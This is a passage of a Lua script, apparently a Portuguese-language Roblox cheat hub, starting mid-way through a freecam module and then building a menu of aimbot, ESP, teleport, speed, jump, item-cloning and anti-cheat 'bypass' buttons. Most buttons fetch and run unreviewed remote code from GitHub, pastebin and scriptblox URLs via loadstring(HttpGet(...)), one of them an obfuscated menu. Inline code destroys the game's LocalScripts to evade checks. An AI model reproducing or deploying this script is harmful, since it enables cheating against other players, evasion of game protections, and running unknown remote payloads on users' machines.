                    gui.Enabled = false
                    end
                    end
                    end
                     
                    cameraFieldOfView = Camera.FieldOfView
                    Camera.FieldOfView = 70
                     
                    cameraType = Camera.CameraType
                    Camera.CameraType = Enum.CameraType.Custom
                     
                    cameraSubject = Camera.CameraSubject
                    Camera.CameraSubject = nil
                     
                    cameraCFrame = Camera.CFrame
                    cameraFocus = Camera.Focus
                     
                    mouseIconEnabled = UserInputService.MouseIconEnabled
                    UserInputService.MouseIconEnabled = false
                     
                    mouseBehavior = UserInputService.MouseBehavior
                    UserInputService.MouseBehavior = Enum.MouseBehavior.Default
                    end
                     
                    -- Restore state
                    function PlayerState.Pop()
                    for name, isEnabled in pairs(coreGuis) do
                    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], isEnabled)
                    end
                    for name, isEnabled in pairs(setCores) do
                    StarterGui:SetCore(name, isEnabled)
                    end
                    for _, gui in pairs(screenGuis) do
                    if gui.Parent then
                    gui.Enabled = true
                    end
                    end
                     
                    Camera.FieldOfView = cameraFieldOfView
                    cameraFieldOfView = nil
                     
                    Camera.CameraType = cameraType
                    cameraType = nil
                     
                    Camera.CameraSubject = cameraSubject
                    cameraSubject = nil
                     
                    Camera.CFrame = cameraCFrame
                    cameraCFrame = nil
                     
                    Camera.Focus = cameraFocus
                    cameraFocus = nil
                     
                    UserInputService.MouseIconEnabled = mouseIconEnabled
                    mouseIconEnabled = nil
                     
                    UserInputService.MouseBehavior = mouseBehavior
                    mouseBehavior = nil
                    end
                    end
                     
                    local function StartFreecam()
                    local cameraCFrame = Camera.CFrame
                    cameraRot = Vector2.new(cameraCFrame:toEulerAnglesYXZ())
                    cameraPos = cameraCFrame.p
                    cameraFov = Camera.FieldOfView
                     
                    velSpring:Reset(Vector3.new())
                    panSpring:Reset(Vector2.new())
                    fovSpring:Reset(0)
                     
                    PlayerState.Push()
                    RunService:BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, StepFreecam)
                    Input.StartCapture()
                    end
                     
                    local function StopFreecam()
                    Input.StopCapture()
                    RunService:UnbindFromRenderStep("Freecam")
                    PlayerState.Pop()
                    end
                     
                    ------------------------------------------------------------------------
                     
                    do
                    local enabled = false
                     
                    local function ToggleFreecam()
                    if enabled then
                    StopFreecam()
                    else
                    StartFreecam()
                    end
                    enabled = not enabled
                    end
                     
                    local function CheckMacro(macro)
                    for i = 1, #macro - 1 do
                    if not UserInputService:IsKeyDown(macro[i]) then
                    return
                    end
                    end
                    ToggleFreecam()
                    end
                     
                    local function HandleActivationInput(action, state, input)
                    if state == Enum.UserInputState.Begin then
                    if input.KeyCode == FREECAM_MACRO_KB[#FREECAM_MACRO_KB] then
                    CheckMacro(FREECAM_MACRO_KB)
                    end
                    end
                    return Enum.ContextActionResult.Pass
                    end
                     
                    ContextActionService:BindActionAtPriority("FreecamToggle", HandleActivationInput, false, TOGGLE_INPUT_PRIORITY, FREECAM_MACRO_KB[#FREECAM_MACRO_KB])
                    end
                    end))
                    for i,v in pairs(mas:GetChildren()) do
                    v.Parent = game:GetService("Players").LocalPlayer.PlayerGui
                    pcall(function() v:MakeJoints() end)
                    end
                    mas:Destroy()
                    for i,v in pairs(cors) do
                    spawn(function()
                    pcall(v)
                    end)
                    end    
            end    
        })
        
        Tab:AddButton({
            Name = "Ver Inventário De Players",
            Callback = function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/G-development-M/DreckModz/main/By_dreck_/InventarioPlayers.lua'))()
              end    
        })
        
        Tab:AddButton({
            Name = "Mudar String/Value -- @zv_yz.",
            Callback = function()
        local Main = loadstring(game:HttpGet('https://raw.githubusercontent.com/Zv-yz/RBXScripts/master/Scripts/ViethinChange.lua'))()
        local Config = {
            BoolValue = true; -- Que seja true ou false
            StringValue = 'F pra geral'; -- A string você deseja
            NumberValue = 9999999999999999999999999; -- Valor do número
            IntValue = 9999999999999999999999999; -- Valor do número
        }
        Main:Change(Config)
              end    
        })
        
        Tab:AddLabel("! Feito por XRX | SYC. Todos os direitos reservados.")
        
        local Hub = Window:MakeTab({
            Name = "+HUB",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })
        
        Hub:AddButton({
            Name = "ACS Antigo >>> Para jogos sem ANT-CHEAT",
            Callback = function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/G-development-M/DreckModz/main/ACSAntigo-F5.lua'))()
              end    
        })
        
        Hub:AddButton({
            Name = "Simple Spy",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
              end    
        })
        
        Hub:AddButton({
            Name = "Felipe Menu",
            Callback = function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/DebugCrazY/FMobfuscated/main/fm.lua'))()
              end    
        })
        
        Hub:AddButton({
            Name = "Infinite Yield",
            Callback = function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
              end    
        })
        
        Hub:AddButton({
            Name = "Dex Explorer",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
              end    
        })
        
        Hub:AddButton({
            Name = "Orca Hub",
            Callback = function()
                loadstring(game:HttpGet(('https://raw.githubusercontent.com/richie0866/orca/master/public/latest.lua'),true))()
              end    
        })
        
        local Visual = Window:MakeTab({
            Name = "Visual",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })
        
        Visual:AddButton({
            Name = "Vereus >>> Dark monster",
            Callback = function()
        loadstring(game:HttpGet("https://scriptblox.com/raw/Client-Replication-Xester-5452"))()
              end    
        })
        
        Visual:AddButton({
            Name = "Dia >>> Deixar de dia",
            Callback = function()
                      local Lighting = game:GetService("Lighting")
        Lighting.TimeOfDay = 12
        Lighting.Brightness = 2
              end    
        })
        
        Visual:AddButton({
            Name = "Noite >>> Deixar de noite",
            Callback = function()
                      game.Lighting.TimeOfDay = "18:00:00"
              end    
        })
        
        local Extra = Window:MakeTab({
            Name = "Aimbot/Esp +",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })
        
        Extra:AddButton({
            Name = "Aimbot V1 >>> PC/MOBILE",
            Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/1Gp9c57U"))()
              end    
        })
        
        Extra:AddButton({
            Name = "Aimbot V2 >>> OwlHub/PC",
            Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))()
              end    
        })

        Extra:AddButton({
            Name = "Aimbot V3 >>> PC/Mobile",
            Callback = function()
                loadstring(game:HttpGet('https://pastebin.com/raw/GzchSUkb'))()
              end    
        })
        
        Extra:AddButton({
            Name = "Esp Players >>> PC/MOBILE",
            Callback = function()
                      local FillColor = Color3.fromRGB(175,25,255)
        local DepthMode = "AlwaysOnTop"
        local FillTransparency = 0.5
        local OutlineColor = Color3.fromRGB(255,255,255)
        local OutlineTransparency = 0
        
        local CoreGui = game:FindService("CoreGui")
        local Players = game:FindService("Players")
        local lp = Players.LocalPlayer
        local connections = {}
        
        local Storage = Instance.new("Folder")
        Storage.Parent = CoreGui
        Storage.Name = "Highlight_Storage"
        
        local function Highlight(plr)
            local Highlight = Instance.new("Highlight")
            Highlight.Name = plr.Name
            Highlight.FillColor = FillColor
            Highlight.DepthMode = DepthMode
            Highlight.FillTransparency = FillTransparency
            Highlight.OutlineColor = OutlineColor
            Highlight.OutlineTransparency = 0
            Highlight.Parent = Storage
            
            local plrchar = plr.Character
            if plrchar then
                Highlight.Adornee = plrchar
            end
        
            connections[plr] = plr.CharacterAdded:Connect(function(char)
                Highlight.Adornee = char
            end)
        end
        
        Players.PlayerAdded:Connect(Highlight)
        for i,v in next, Players:GetPlayers() do
            Highlight(v)
        end
        
        Players.PlayerRemoving:Connect(function(plr)
            local plrname = plr.Name
            if Storage[plrname] then
                Storage[plrname]:Destroy()
            end
            if connections[plr] then
                connections[plr]:Disconnect()
            end
        end)
              end    
        })

        Extra:AddButton({
            Name = "Esp Box >>> PC/Mobile",
            Callback = function()
          loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Universal-esp-box-4269"))()
              end    
        })

        Extra:AddButton({
            Name = "Name Esp >>> PC/Mobile",
            Callback = function()
                local c = workspace.CurrentCamera
                local ps = game:GetService("Players")
                local lp = ps.LocalPlayer
                local rs = game:GetService("RunService")
                
                local function esp(p,cr)
                    local h = cr:WaitForChild("Humanoid")
                    local hrp = cr:WaitForChild("Head")
                
                    local text = Drawing.new("Text")
                    text.Visible = false
                    text.Center = true
                    text.Outline = false 
                    text.Font = 3
                    text.Size = 16.16
                    text.Color = Color3.new(170,170,170)
                
                    local conection
                    local conection2
                    local conection3
                
                    local function dc()
                        text.Visible = false
                        text:Remove()
                        if conection then
                            conection:Disconnect()
                            conection = nil 
                        end
                        if conection2 then
                            conection2:Disconnect()
                            conection2 = nil 
                        end
                        if conection3 then
                            conection3:Disconnect()
                            conection3 = nil 
                        end
                    end
                
                    conection2 = cr.AncestryChanged:Connect(function(_,parent)
                        if not parent then
                            dc()
                        end
                    end)
                
                    conection3 = h.HealthChanged:Connect(function(v)
                        if (v<=0) or (h:GetState() == Enum.HumanoidStateType.Dead) then
                            dc()
                        end
                    end)
                
                    conection = rs.RenderStepped:Connect(function()
                        local hrp_pos,hrp_onscreen = c:WorldToViewportPoint(hrp.Position)
                        if hrp_onscreen then
                            text.Position = Vector2.new(hrp_pos.X, hrp_pos.Y - 27)
                            text.Text = "[ "..p.Name.." ]"
                            text.Visible = true
                        else
                            text.Visible = false
                        end
                    end)
                end
                
                local function p_added(p)
                    if p.Character then
                        esp(p,p.Character)
                    end
                    p.CharacterAdded:Connect(function(cr)
                        esp(p,cr)
                    end)
                end
                
                for i,p in next, ps:GetPlayers() do 
                    if p ~= lp then
                        p_added(p)
                    end
                end
                
                ps.PlayerAdded:Connect(p_added)
              end    
        })


        local Desemp = Window:MakeTab({
            Name = "Desempenho",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })
        
        Desemp:AddButton({
            Name = "Fps Booster >>> Melhorar o desempenho",
            Callback = function()
        loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-FPS-BOOST-2022-3864"))()
              end    
        })
        
        Desemp:AddButton({
            Name = "Anti Lag >>> Melhorar o desempenho (2)",
            Callback = function()
                local ToDisable = {
                    Textures = true,
                    VisualEffects = true,
                    Parts = true,
                    Particles = true,
                    Sky = true
                }
                
                local ToEnable = {
                    FullBright = false
                }
                
                local Stuff = {}
                
                for _, v in next, game:GetDescendants() do
                    if ToDisable.Parts then
                        if v:IsA("Part") or v:IsA("Union") or v:IsA("BasePart") then
                            v.Material = Enum.Material.SmoothPlastic
                            table.insert(Stuff, 1, v)
                        end
                    end
                    
                    if ToDisable.Particles then
                        if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire") then
                            v.Enabled = false
                            table.insert(Stuff, 1, v)
                        end
                    end
                    
                    if ToDisable.VisualEffects then
                        if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect") then
                            v.Enabled = false
                            table.insert(Stuff, 1, v)
                        end
                    end
                    
                    if ToDisable.Textures then
                        if v:IsA("Decal") or v:IsA("Texture") then
                            v.Texture = ""
                            table.insert(Stuff, 1, v)
                        end
                    end
                    
                    if ToDisable.Sky then
                        if v:IsA("Sky") then
                            v.Parent = nil
                            table.insert(Stuff, 1, v)
                        end
                    end
                end
                
                game:GetService("TestService"):Message("Effects Disabler Script : Successfully disabled "..#Stuff.." assets / effects. Settings :")
                
                for i, v in next, ToDisable do
                    print(tostring(i)..": "..tostring(v))
                end
                
                if ToEnable.FullBright then
                    local Lighting = game:GetService("Lighting")
                    
                    Lighting.FogColor = Color3.fromRGB(255, 255, 255)
                    Lighting.FogEnd = math.huge
                    Lighting.FogStart = math.huge
                    Lighting.Ambient = Color3.fromRGB(255, 255, 255)
                    Lighting.Brightness = 5
                    Lighting.ColorShift_Bottom = Color3.fromRGB(255, 255, 255)
                    Lighting.ColorShift_Top = Color3.fromRGB(255, 255, 255)
                    Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
                    Lighting.Outlines = true
                end
              end    
        })

        Desemp:AddButton({
            Name = "Fps Booster + Anti Lag >>> Melhorar o desempenho(3)",
            Callback = function()
                local decalsyeeted = true
                local g = game
                local w = g.Workspace
                local l = g.Lighting
                local t = w.Terrain
                t.WaterWaveSize = 0
                t.WaterWaveSpeed = 0
                t.WaterReflectance = 0
                t.WaterTransparency = 0
                l.GlobalShadows = false
                l.FogEnd = 9e9
                l.Brightness = 0
                settings().Rendering.QualityLevel = "Level01"
                for i, v in pairs(g:GetDescendants()) do
                    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
                        v.Material = "Plastic"
                        v.Reflectance = 0
                    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
                        v.Transparency = 1
                    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                        v.Lifetime = NumberRange.new(0)
                    elseif v:IsA("Explosion") then
                        v.BlastPressure = 1
                        v.BlastRadius = 1
                    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
                        v.Enabled = false
                    elseif v:IsA("MeshPart") then
                        v.Material = "Plastic"
                        v.Reflectance = 0
                        v.TextureID = 10385902758728957
                    end
                end
                for i, e in pairs(l:GetChildren()) do
                    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
                        e.Enabled = false
                    end
                end
              end    
        })
        
        local Misc = Window:MakeTab({
            Name = "Misc",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })
        
        Misc:AddButton({
            Name = "Inv >>> Deletar itens do inventario",
            Callback = function()
                      local player = game.Players.LocalPlayer
        local backpack = player:FindFirstChild("Backpack")
        
        for _, item in pairs(backpack:GetChildren()) do
            item:Remove()
        end
              end    
        })
        
        Misc:AddButton({
            Name = "Deletar >>> Deletar itens duplicados",
            Callback = function()
                      local player = game.Players.LocalPlayer
        local backpack = player.Backpack
        
        if backpack then
            local items = {}
        
            for _, item in pairs(backpack:GetChildren()) do
                if not items[item.Name] then
                    items[item.Name] = true
                else
                    item:Remove()
                end
            end
        end
              end    
        })
        
        Misc:AddButton({
            Name = "Clonar Itens >>> Funciona em alguns games",
            Callback = function()
                for i, v in pairs(game:GetDescendants()) do
                    if v:IsA('Tool') then
                        v.Parent = game:GetService('Players').LocalPlayer.Backpack
                    end
                end
                
                game:GetService('Players').LocalPlayer.Character.Humanoid.Died:Connect(function()
                    for i, v in pairs(game:GetService('Players').LocalPlayer.Backpack:GetDescendants()) do
                        if v:IsA('Tool') then
                            v.Parent = game:GetService('Teams')
                        end
                    end
                    for i, v in pairs(game:GetService('Players').LocalPlayer.Character:GetDescendants()) do
                        if v:IsA('Tool') then
                            v.Parent = game:GetService('Teams')
                        end
                    end
                end)
              end    
        })
        
        
        Misc:AddButton({
            Name = "Kick >>> Rejoin!",
            Callback = function()
                      local player = game.Players.LocalPlayer
        player:Kick()
              end    
        })
        
        Misc:AddButton({
            Name = "Reset >>> Define a vida do jogador para 0",
            Callback = function()
                      local player = game.Players.LocalPlayer
        if player then
            local character = player.Character
            if character then
                local humanoid = character:FindFirstChild("Humanoid")
                if humanoid then
                    humanoid.Health = 0
                end
            end
        end
              end    
        })
        
        Misc:AddButton({
            Name = "Keyboard >>> Teclado flutuante",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
              end    
        })
        
        local TP = Window:MakeTab({
            Name = "Teleport",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })
        
        TP:AddTextbox({
            Name = "TP >>> IR ATÉ O JOGADOR (NOME!)",
            Default = "?",
            TextDisappear = true,
            Callback = function(Value)
                local targetPlayer = game.Players:FindFirstChild(Value)
        
                if not targetPlayer then
                    local initials = string.sub(Value, 1, 1)
                    for _, player in pairs(game.Players:GetPlayers()) do
                        if string.sub(player.Name, 1, 1) == initials then
                            targetPlayer = player
                            break
                        end
                    end
                end
        
                if targetPlayer then
                    local playerToTeleport = game.Players.LocalPlayer
                    local targetCharacter = targetPlayer.Character
        
                    if playerToTeleport and targetCharacter then
                        playerToTeleport.Character:SetPrimaryPartCFrame(targetCharacter.HumanoidRootPart.CFrame)
                    end
                end
            end
        })
        
        TP:AddButton({
            Name = "TP >>> IR ATÉ O PLAYER (OUTRO TIME!)",
            Callback = function()
                      local player = game.Players.LocalPlayer
        local playerTeam = player.Team
        local targetPlayer = nil
        
        for _, otherPlayer in pairs(game.Players:GetPlayers()) do
            if otherPlayer.Team ~= playerTeam then
                targetPlayer = otherPlayer
                break
            end
        end
        
        if targetPlayer then
            local targetPosition = targetPlayer.Character.HumanoidRootPart.Position
            player.Character:MoveTo(targetPosition)
        end
              end    
        })
        
        TP:AddButton({
            Name = "TP >>> IR ATÉ O PLAYER (+PERTO!)",
            Callback = function()
                      local jogador = game.Players.LocalPlayer
        
        function encontrarJogadorMaisProximo()
            local jogadores = game.Players:GetPlayers()
            local jogadorMaisProximo = nil
            local menorDistancia = math.huge
        
            local minhaPosicao = jogador.Character.HumanoidRootPart.Position
        
            for _, outroJogador in pairs(jogadores) do
                if outroJogador ~= jogador and outroJogador.Character and outroJogador.Character:FindFirstChild("HumanoidRootPart") then
                    local distancia = (minhaPosicao - outroJogador.Character.HumanoidRootPart.Position).Magnitude
                    if distancia < menorDistancia then
                        jogadorMaisProximo = outroJogador
                        menorDistancia = distancia
                    end
                end
            end
        
            return jogadorMaisProximo
        end
        
        local jogadorAlvo = encontrarJogadorMaisProximo()
        if jogadorAlvo then
            local posicaoAlvo = jogadorAlvo.Character.HumanoidRootPart.Position
            jogador.Character:SetPrimaryPartCFrame(CFrame.new(posicaoAlvo))
        end
              end    
        })
        
        TP:AddButton({
            Name = "TP >>> IR ATÉ O PLAYER (+LONGE!)",
            Callback = function()
                      local player = game.Players.LocalPlayer
        local localPlayerPosition = player.Character and player.Character.PrimaryPart.Position
        
        if localPlayerPosition then
            local players = game:GetService("Players"):GetPlayers()
            local maxDistance = 0
            local targetPlayer = nil
        
            for _, otherPlayer in pairs(players) do
                if otherPlayer ~= player then
                    local character = otherPlayer.Character
                    if character and character:FindFirstChild("HumanoidRootPart") then
                        local distance = (localPlayerPosition - character.HumanoidRootPart.Position).Magnitude
                        if distance > maxDistance then
                            maxDistance = distance
                            targetPlayer = otherPlayer
                        end
                    end
                end
            end
        
            if targetPlayer then
                local targetPosition = targetPlayer.Character.HumanoidRootPart.Position
                player.Character:MoveTo(targetPosition)
            end
        end
              end    
        })
        
        TP:AddButton({
            Name = "TP >>> IR ATÉ UM PLAYER DO MESMO TIME",
            Callback = function()
                local player = game.Players.LocalPlayer
        local playerName = player.Name
        
        function findPlayerOnSameTeam()
            local players = game.Players:GetPlayers()
            for _, otherPlayer in ipairs(players) do
                if otherPlayer.Team and otherPlayer ~= player and otherPlayer.Team.Name == player.Team.Name then
                    return otherPlayer
                end
            end
            return nil
        end
        
        function moveToPlayerOnSameTeam()
            local target = findPlayerOnSameTeam()
            if target then
                player.Character:MoveTo(target.Character.HumanoidRootPart.Position)
            end
        end
        
        moveToPlayerOnSameTeam()
              end    
        })
        
        TP:AddButton({
            Name = "TP CARROS >>> IR ATÉ UM CARRO PROXIMO",
            Callback = function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/G-development-M/DreckModz/main/By_dreck_/TpCarrosCadeiras.lua'))()
              end    
        })
        
        local SP = Window:MakeTab({
            Name = "Speed/Jump",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })
        
        SP:AddButton({
            Name = "Speed >>> Aumentar a velocidade",
            Callback = function()
                      local velocidade = 300
        local jogador = game.Players.LocalPlayer
        jogador.Character:FindFirstChild("Humanoid").WalkSpeed = velocidade
              end    
        })

        SP:AddButton({
            Name = "Inf jump >>> Pode Pular Quanto Quiser",
            Callback = function()
                local InfiniteJumpEnabled = true
                game:GetService("UserInputService").JumpRequest:connect(function()
                    if InfiniteJumpEnabled then
                        game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
                    end
                end) 
              end    
        })
        
        SP:AddTextbox({
            Name = "Speed V2",
            Default = "?",
            TextDisappear = true,
            Callback = function(Value)
                local newSpeed = tonumber(Value)
                if newSpeed and newSpeed >= 0 then
                    local player = game.Players.LocalPlayer
                    if player and player.Character and player.Character:FindFirstChild("Humanoid") then
                        player.Character.Humanoid.WalkSpeed = newSpeed
                    end
                end
            end
        })
        
        SP:AddSlider({
            Name = "SpeedSlider",
            Min = 16,
            Max = 900,
            Default = 16,
            Color = Color3.fromRGB(255, 255, 255),
            Increment = 1,
            ValueName = "Speed",
            Callback = function(Value)
                local player = game.Players.LocalPlayer
                local character = player.Character
                if character then
                    local humanoid = character:FindFirstChild("Humanoid")
                    if humanoid then
                        humanoid.WalkSpeed = Value
                    end
                end
            end
        })
        
        SP:AddSlider({
            Name = "JumpHeightSlider",
            Min = 16,
            Max = 900,
            Default = 50,
            Color = Color3.fromRGB(255, 255, 255),
            Increment = 1,
            ValueName = "JumpHeight",
            Callback = function(Value)
                local player = game.Players.LocalPlayer
                local character = player.Character
                if character then
                    local humanoid = character:FindFirstChild("Humanoid")
                    if humanoid then
                        humanoid.JumpPower = Value
                    end
                end
            end
        })
        
        local EB = Window:MakeTab({
            Name = "EB",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })
        
        EB:AddButton({
            Name = "Hub Troll Viethin",
            Callback = function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/Arthurkla/teste/main/ViethinScript2'))()
              end    
        })

        EB:AddButton({
            Name = "Hub Pra Rp/Eb",
            Callback = function()
                -- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local Fly = Instance.new("TextButton")
local Aimbot = Instance.new("TextButton")
local Esp = Instance.new("TextButton")
local PegarArmas = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Main.BorderColor3 = Color3.fromRGB(255, 255, 255)
Main.BorderSizePixel = 2
Main.Position = UDim2.new(0.324593127, 0, 0.242946714, 0)
Main.Size = UDim2.new(0, 387, 0, 328)
Main.Active = true
Main.Draggable = true

TextLabel.Parent = Main
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BorderSizePixel = 2
TextLabel.Size = UDim2.new(0, 387, 0, 38)
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.Text = "Script"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 25.000

Fly.Name = "Infinite Yield"
Fly.Parent = Main
Fly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Fly.BorderColor3 = Color3.fromRGB(0, 0, 255)
Fly.BorderSizePixel = 2
Fly.Position = UDim2.new(0.0465116277, 0, 0.207317069, 0)
Fly.Size = UDim2.new(0, 143, 0, 37)
Fly.Font = Enum.Font.SourceSansBold
Fly.Text = "Infinite Yield"
Fly.TextColor3 = Color3.fromRGB(255, 255, 255)
Fly.TextSize = 25.000
Fly.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

Aimbot.Name = "Aimbot"
Aimbot.Parent = Main
Aimbot.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Aimbot.BorderColor3 = Color3.fromRGB(0, 0, 255)
Aimbot.BorderSizePixel = 2
Aimbot.Position = UDim2.new(0.571059406, 0, 0.207317069, 0)
Aimbot.Size = UDim2.new(0, 143, 0, 37)
Aimbot.Font = Enum.Font.SourceSansBold
Aimbot.Text = "Aimbot"
Aimbot.TextColor3 = Color3.fromRGB(255, 255, 255)
Aimbot.TextSize = 25.000
Aimbot.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://pastebin.com/raw/GzchSUkb'))()
end)

Esp.Name = "Esp"
Esp.Parent = Main
Esp.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Esp.BorderColor3 = Color3.fromRGB(0, 0, 255)
Esp.BorderSizePixel = 2
Esp.Position = UDim2.new(0.571059406, 0, 0.536585391, 0)
Esp.Size = UDim2.new(0, 143, 0, 37)
Esp.Font = Enum.Font.SourceSansBold
Esp.Text = "Esp"
Esp.TextColor3 = Color3.fromRGB(255, 255, 255)
Esp.TextSize = 25.000
Esp.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://pastebin.com/raw/0gahF9Ag'))()
end)

PegarArmas.Name = "Pegar Armas"
PegarArmas.Parent = Main
PegarArmas.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
PegarArmas.BorderColor3 = Color3.fromRGB(0, 0, 255)
PegarArmas.BorderSizePixel = 2
PegarArmas.Position = UDim2.new(0.0465116277, 0, 0.536585391, 0)
PegarArmas.Size = UDim2.new(0, 143, 0, 37)
PegarArmas.Font = Enum.Font.SourceSansBold
PegarArmas.Text = "Acs 1.7.5"
PegarArmas.TextColor3 = Color3.fromRGB(255, 255, 255)
PegarArmas.TextSize = 25.000
PegarArmas.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://pastebin.com/raw/P07XWPCg'))()
end)

TextLabel_2.Parent = Main
TextLabel_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.483204126, 0, 0.847561002, 0)
TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
TextLabel_2.Font = Enum.Font.SourceSansBold
TextLabel_2.Text = "By - @sycx000"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 25.000
              end    
        })
        
        EB:AddButton({
            Name = "Carros Free Eb Do Tevez",
            Callback = function()
                loadstring(game:HttpGet("https://pastebin.com/raw/kSaMJ2Cn", true))()
              end    
        })
        
        EB:AddButton({
            Name = "Bypass Eb Do Tevez",
            Callback = function()
                local player = game.Players.LocalPlayer
        
        local function destroyLocalScripts(player)
            local character = player.Character
            if character then
                local descendants = character:GetDescendants()
                for i, v in ipairs(descendants) do
                    if v:IsA("LocalScript") and v.Name:match("{") then
                        v:Destroy()
                    end
                end
            end
        end
        destroyLocalScripts(player)
        
        game:GetService('Players').LocalPlayer.Character.Humanoid.Died:Connect(function()
        destroyLocalScripts(player)
        end)
              end    
        })
    end
})
